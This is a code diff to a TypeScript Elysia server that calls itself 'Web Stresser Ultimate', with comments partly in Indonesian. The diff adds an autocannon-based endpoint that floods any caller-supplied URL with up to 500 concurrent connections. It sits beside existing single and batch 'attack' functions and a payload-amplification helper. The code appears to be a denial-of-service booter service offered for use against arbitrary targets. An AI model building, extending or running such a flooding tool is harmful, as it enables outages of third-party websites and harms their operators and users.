@@ -1,7 +1,8 @@
 import { Elysia, t } from 'elysia';
 import { setGlobalDispatcher, Agent } from 'undici';
+import autocannon from 'autocannon';
 
-// Koneksi pool untuk efisiensi
+// Konfigurasi global agent untuk fetch
 const globalAgent = new Agent({
   connections: 100,
   pipelining: 1,
@@ -9,7 +10,7 @@ const globalAgent = new Agent({
 });
 setGlobalDispatcher(globalAgent);
 
-// Hitung user aktif
+// Active users counter
 const activeUsers = new Map<string, number>();
 setInterval(() => {
   const now = Date.now();
@@ -18,7 +19,7 @@ setInterval(() => {
   }
 }, 30000);
 
-// Helper untuk payload amplification
+// Helper functions
 function randomString(n: number): string {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   let result = '';
@@ -33,7 +34,7 @@ function generateAmplificationPayload(kb: number, ampType: string): string {
   return randomString(size);
 }
 
-// Serangan single (dipanggil oleh frontend untuk setiap request)
+// Single attack (dipakai untuk SINGLE dan BATCH)
 interface SingleAttackParams {
   url: string;
   method: string;
@@ -170,7 +171,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   };
 }
 
-// Serangan batch (backend concurrency)
+// Batch attack (backend concurrency)
 interface BatchAttackParams {
   url: string;
   method: string;
@@ -245,6 +246,27 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
   };
 }
 
+// AutoCannon attack (hanya berfungsi di environment yang mendukung, misal lokal)
+async function autocannonAttack(params: any): Promise<any> {
+  return new Promise((resolve, reject) => {
+    const instance = autocannon({
+      url: params.url,
+      connections: Math.min(params.connections, 500),
+      duration: Math.min(params.duration, 10),
+      method: params.method,
+      headers: params.headers,
+      body: params.body,
+      amount: params.amount,
+      pipelining: 1,
+      reconnectRate: 0,
+    }, (err, result) => {
+      if (err) reject(err);
+      else resolve(result);
+    });
+    autocannon.track(instance, { renderProgressBar: true });
+  });
+}
+
 // ==================== Elysia App ====================
 export const app = new Elysia()
   .onError(({ error, set }) => {
@@ -255,8 +277,8 @@ export const app = new Elysia()
   })
   .get('/api/status', () => ({
     status: 'ok',
-    message: 'Web Stresser Ultimate - Elysia on Vercel (AWS Region)',
-    version: '3.0.0',
+    message: 'Web Stresser Ultimate - Elysia + AutoCannon',
+    version: '4.0.0',
   }))
   .post('/api/attack', async ({ body }) => {
     try {
@@ -304,6 +326,29 @@ export const app = new Elysia()
       amplifyType: t.String(),
       concurrency: t.Number(),
       total: t.Number(),
+    }),
+  })
+  .post('/api/autocannon', async ({ body }) => {
+    // AutoCannon hanya bisa berjalan di environment non-serverless (lokal)
+    // Cek apakah di Vercel (dengan env var) atau waktu terbatas
+    if (process.env.VERCEL) {
+      return { success: false, error: 'AutoCannon tidak tersedia di Vercel karena keterbatasan waktu eksekusi. Jalankan secara lokal.' };
+    }
+    try {
+      const result = await autocannonAttack(body);
+      return { success: true, result };
+    } catch (err: any) {
+      return { success: false, error: err.message };
+    }
+  }, {
+    body: t.Object({
+      url: t.String(),
+      connections: t.Number(),
+      duration: t.Number(),
+      method: t.Optional(t.String()),
+      headers: t.Optional(t.Record(t.String(), t.String())),
+      body: t.Optional(t.String()),
+      amount: t.Optional(t.Number()),
     }),
   })
   .get('/api/heartbeat', ({ request }) => {
